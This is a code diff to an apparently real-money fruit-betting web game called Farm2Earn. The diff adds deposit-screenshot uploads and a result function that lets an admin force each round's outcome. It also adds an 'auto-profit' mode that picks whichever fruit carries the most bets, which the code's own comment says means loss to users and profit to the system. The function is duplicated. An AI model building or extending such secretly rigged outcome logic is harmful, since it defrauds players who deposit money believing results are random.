@@ -4,8 +4,18 @@
 <meta charset="utf-8"/>
 <title>Farm2Earn — Play</title>
 <meta name="viewport" content="width=device-width,initial-scale=1"/>
+
+<!-- ✅ Firebase SDKs — EXACT ORDER -->
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage-compat.js"></script>
+
+<!-- Fonts -->
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+
 <style>
+/* Your CSS same as before */
+
 :root{
   --bg:#06060a; --card:#0f1114; --muted:#9aa3b2; --gold:#f6c94b;
   --accent:#7ef2b3; --glass: rgba(255,255,255,0.03);
@@ -343,8 +353,6 @@ th,td{padding:8px;text-align:left;border-bottom:1px dashed rgba(255,255,255,0.03
 }
 
 </style>
- <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
 </head>
 <body>
 
@@ -1744,6 +1752,77 @@ function writeUser(uid, data) {
     return db.collection("users").doc(uid).set(data);
 }
 
+async function getFinalFruit() {
+    const forceDoc = await db.collection("forceFruitResult").doc("next").get();
+
+    if (forceDoc.exists && forceDoc.data().locked) {
+        return forceDoc.data().fruit;   // Admin manual result
+    }
+
+    const modeDoc = await db.collection("fruzoSettings").doc("mode").get();
+
+    if (modeDoc.exists && modeDoc.data().mode === "auto-profit") {
+        return autoProfitFruit();
+    }
+
+    return randomFruit();
+}
+async function getFinalFruit() {
+    const forceDoc = await db.collection("forceFruitResult").doc("next").get();
+
+    if (forceDoc.exists && forceDoc.data().locked) {
+        return forceDoc.data().fruit;   // Admin manual result
+    }
+
+    const modeDoc = await db.collection("fruzoSettings").doc("mode").get();
+
+    if (modeDoc.exists && modeDoc.data().mode === "auto-profit") {
+        return autoProfitFruit();
+    }
+
+    return randomFruit();
+}
+function autoProfitFruit() {
+
+    let totals = {}; // each fruit total bet amount
+
+    bets.forEach(b => {
+        totals[b.fruit] = (totals[b.fruit] || 0) + b.amount;
+    });
+
+    // fruit with highest bets → LOSS to users → PROFIT to system
+    let bestFruit = null;
+    let maxLoss = -9999;
+
+    for (let f in totals) {
+        if (totals[f] > maxLoss) {
+            maxLoss = totals[f];
+            bestFruit = f;
+        }
+    }
+
+    return bestFruit || randomFruit();
+}
+function randomFruit(){
+  const fruits = ["apple","banana","mango","grapes","orange","avocado"];
+  return fruits[Math.floor(Math.random()*fruits.length)];
+}
+async function declareResult(){
+    const finalFruit = await getFinalFruit();
+
+    document.getElementById("resultFruit").innerText = finalFruit.toUpperCase();
+    
+    db.collection("fruitResults").doc(currentPeriod).set({
+       fruit: finalFruit,
+       period: currentPeriod,
+       time: Date.now()
+    });
+
+    // Reset manual result
+    db.collection("forceFruitResult").doc("next").set({
+       locked:false
+    });
+}
 
 
     
@@ -1775,6 +1854,52 @@ async function createNewFruitPeriod() {
 
     startFruitTimer();
 }
+function openScreenshotPopup() {
+  document.getElementById("ssPopup").style.display = "flex";
+}
+
+function closeSSPopup() {
+  document.getElementById("ssPopup").style.display = "none";
+}
+
+async function uploadScreenshot() {
+  const file = document.getElementById("ssFile").files[0];
+  if (!file) return showMessage("Screenshot select karo!", "error");
+
+  // convert file → base64 (FREE, no storage)
+  const reader = new FileReader();
+  reader.onloadend = async function () {
+    const base64Data = reader.result;  // full base64 string
+
+    const id = randomID();
+    const data = {
+      id,
+      owner: currentUser,
+      amount: __lastDepositAmt,
+      status: "pending",
+      screenshot: base64Data,  // storing directly in Firestore
+      created: Date.now()
+    };
+
+    // save local
+    const arr = getStore("deposits", []);
+    arr.unshift(data);
+    setStore("deposits", arr);
+
+    // save firestore
+    if (firebaseEnabled && db)
+      await writeDoc("deposits", id, data);
+
+    closeSSPopup();
+    closePopup();
+    renderTables();
+
+    showMessage("Deposit request submitted!", "success");
+  };
+
+  reader.readAsDataURL(file); // convert to base64
+}
+
 
 
 
@@ -2136,7 +2261,7 @@ function depositViaQR(amt) {
     `,
     `
       ${mobileButtons}
-      <button class='btn gold' onclick="finishDeposit()" style="width:100%;margin-top:10px;">DONE</button>
+      <button class='btn gold' onclick="openScreenshotPopup()" style='width:100%;margin-top:10px;'>DONE</button>
     `
   );
 }
@@ -2666,6 +2791,16 @@ function startWithdrawRealtime() {
 
       });
 }
+function generatePeriod() {
+    const now = new Date();
+    const y = now.getFullYear();
+    const m = ("0"+(now.getMonth()+1)).slice(-2);
+    const d = ("0"+now.getDate()).slice(-2);
+
+    const num = Math.floor(Math.random() * 99999).toString().padStart(5, "0");
+
+    return `F2E-${y}${m}${d}-${num}`;
+}
 
 
 /* =====================================================
@@ -2775,6 +2910,23 @@ function fbWrite(col, id, data) {
 
 <!-- Firebase SDK (optional) -->
 <!-- If you want Firebase live features, include these when hosting:-->
+<!-- Screenshot Upload Popup -->
+<div id="ssPopup" class="overlay" style="display:none;">
+  <div class="popup" style="width:340px;">
+    <span class="popup-close" onclick="closeSSPopup()">✖</span>
+
+    <h2>Upload Screenshot</h2>
+    <p class="small">Payment screenshot upload kare:</p>
+
+    <input type="file" id="ssFile" accept="image/*"
+           style="margin-top:10px;color:#fff">
+
+    <button class="btn gold" onclick="uploadScreenshot()"
+            style="width:100%;margin-top:12px;">
+      Upload & Submit
+    </button>
+  </div>
+</div>
 
 
 </body>
